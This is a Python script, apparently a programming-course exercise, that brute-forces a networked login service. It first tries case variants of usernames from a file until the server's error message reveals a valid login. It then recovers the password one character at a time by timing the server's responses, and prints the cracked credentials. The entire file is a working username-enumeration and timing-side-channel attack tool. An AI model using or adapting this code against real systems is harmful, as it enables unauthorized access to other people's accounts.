import socket
import sys
import itertools
import json
import string
import time


# find all the possible combinations of upper and lower case letters for each login provided in file
def login(ids):
    for i in ids:
        for x in map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in i.strip("\n")))):
            yield x


# iterates through all upper/lower letters and numbers
def password_attempts():
    to_try = string.ascii_letters + string.digits
    while True:
        for i in to_try:
            yield i


# takes command line argument and retrieves address and port for a server
# then connects to the server
args = sys.argv
hostname = args[1]
port = int(args[2])
address = (hostname, port)
the_socket = socket.socket()
the_socket.connect(address)
response = ""
# receives file of possible logins
file = open("logins.txt", "r")
logins = login(file)
attempts = password_attempts()
pswrd = password_attempts()
# used to store correct login and password
password = ""
login = ""

# sends login to the server and checks if the response is correct
while True:
    check_login = next(logins)
    to_send = {"login": check_login, "password": ""}
    the_socket.send(json.dumps(to_send).encode())
    response = the_socket.recv(1024)
    if json.loads(response.decode("utf-8"))["result"] == "Wrong password!":
        login = check_login
        break
# if response from server is "Wrong password!" instead of "Wrong login!"
# it continues on to brute force the password
while True:
    pass_attempt = next(pswrd)
    to_send = {"login": login, "password": password + pass_attempt}
    the_socket.send(json.dumps(to_send).encode())
    start = time.perf_counter()
    response = the_socket.recv(1024)
    end = time.perf_counter()
    total = end - start # check amount of time elapsed to receive a response from the server
    # when successful print login and password in JSON
    if json.loads(response.decode("utf-8"))["result"] == "Connection success!":
        print(json.dumps(to_send))
        break
    # saves each correct char for the password
    elif total >= 0.1: # if there is a delayed response, add char to current string of passwords until it is correct
        password += pass_attempt
file.close()
the_socket.close()
